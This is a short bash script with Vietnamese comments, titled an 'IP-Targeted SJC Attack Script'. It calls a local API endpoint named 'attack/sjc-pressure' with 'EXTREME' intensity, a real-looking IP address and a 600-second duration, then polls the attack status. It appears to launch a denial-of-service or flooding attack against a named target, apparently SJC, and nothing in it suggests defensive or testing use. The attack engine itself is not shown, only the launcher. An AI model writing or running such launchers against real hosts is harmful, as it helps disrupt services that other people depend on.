
#!/bin/bash

# IP-Targeted SJC Attack Script
# Tấn công SJC với IP cụ thể

API_BASE="http://localhost:5000"
TARGET_IP="104.16.35.67"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${RED}🚨 TẤN CÔNG SJC VỚI IP ĐƯỢC CHỈ ĐỊNH${NC}"
echo -e "${YELLOW}🌐 Target IP: $TARGET_IP${NC}"

# Execute SJC attack with specific IP
echo -e "${RED}⚔️ Khởi chạy tấn công SJC...${NC}"
curl -X POST "$API_BASE/api/attack/sjc-pressure" \
    -H "Content-Type: application/json" \
    -d '{
        "intensity": "EXTREME",
        "sourceIP": "'$TARGET_IP'",
        "duration": 600
    }' | jq '.'

echo -e "${GREEN}✅ Tấn công từ IP $TARGET_IP hoàn thành!${NC}"

# Monitor attack results
echo -e "${YELLOW}📊 Kiểm tra kết quả...${NC}"
curl -X GET "$API_BASE/api/attack/status" | jq '.'
